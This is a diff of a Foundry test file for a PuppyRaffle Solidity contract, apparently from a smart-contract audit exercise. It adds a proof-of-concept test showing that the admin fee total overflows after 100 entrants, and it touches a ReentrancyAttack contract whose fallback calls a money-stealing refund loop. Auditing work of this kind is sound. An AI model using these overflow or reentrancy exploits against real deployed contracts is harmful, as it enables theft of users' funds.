@@ -160,13 +160,11 @@ contract PuppyRaffleTest is Test {
     /////////////////////
     modifier playersEntered() {
         address[] memory players = new address[](7);
-        players[0] = playerOne;
-        players[1] = playerTwo;
-        players[2] = playerThree;
-        players[3] = playerFour;
-        players[4] = playerFive;
-        players[5] = playerSix;
-        players[6] = playerSeven;
+
+        for (uint256 i = 0; i < 7; i++) {
+            players[i] = address(uint160(i + 1)); // Create new address and assign it to the players array
+        }
+
         puppyRaffle.enterRaffle{value: entranceFee * 7}(players);
         _;
     }
@@ -204,8 +202,8 @@ contract PuppyRaffleTest is Test {
         uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
         vm.prank(playerOne);
         puppyRaffle.refund(indexOfPlayer);
-         vm.prank(playerTwo);
-        puppyRaffle.refund(indexOfPlayer+1);
+        vm.prank(playerTwo);
+        puppyRaffle.refund(indexOfPlayer + 1);
 
         vm.warp(block.timestamp + duration + 1);
         vm.roll(block.number + 1);
@@ -264,6 +262,37 @@ contract PuppyRaffleTest is Test {
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
     }
 
+    // @audit-issue - Overflow
+    /**
+     * @notice This test is used to check if the PuppyRaffle contract is vulnerable to overflow attacks
+     * @dev The test creates 100 participants and enters them into the raffle. The contract should not be able to overflow the total fees of the admin
+     * after 100 participants have entered the raffle, we select a winner
+     * our totalAmountCollected should be 100 ether
+     * so when we draw a winner, according to our system our admin should receive 20% of the totalAmountCollected which is 20 ether
+     * so the total fees of the admin should be more than or equal to 20 ether
+     * but if the contract is vulnerable to overflow attacks, the total fees of the admin will be less than 20 ether
+     * that's what we can check in this test
+     * after entering 100 participants and selecting a winner, the total fees of the admin becomes less than 2 ether, let alone 20 ether
+     */
+    function testAttackWithOverflow() public payable {
+        uint256 NUM_OF_PARTICIPANTS = 100;
+        address[] memory players = new address[](NUM_OF_PARTICIPANTS);
+
+        for (uint256 i = 0; i < NUM_OF_PARTICIPANTS; i++) {
+            players[i] = address(uint160(i + 1)); // Create new address and assign it to the players array
+        }
+
+        puppyRaffle.enterRaffle{value: entranceFee * NUM_OF_PARTICIPANTS}(players);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        puppyRaffle.selectWinner();
+
+        console.log("Total fees of the admin: ", puppyRaffle.totalFees());
+        assert(puppyRaffle.totalFees() < 2e18);
+    }
+
     // @audit-issue - This test is used to test reentrancy attack on the PuppyRaffle contract
     function testReentrancyRefund() public {
         address[] memory players = new address[](4);
@@ -308,6 +337,7 @@ contract ReentrancyAttack {
             puppyRaffle.refund(puppyRaffle.getActivePlayerIndex(address(this)));
         }
     }
+
     fallback() external payable {
         _stealMoney();
     }
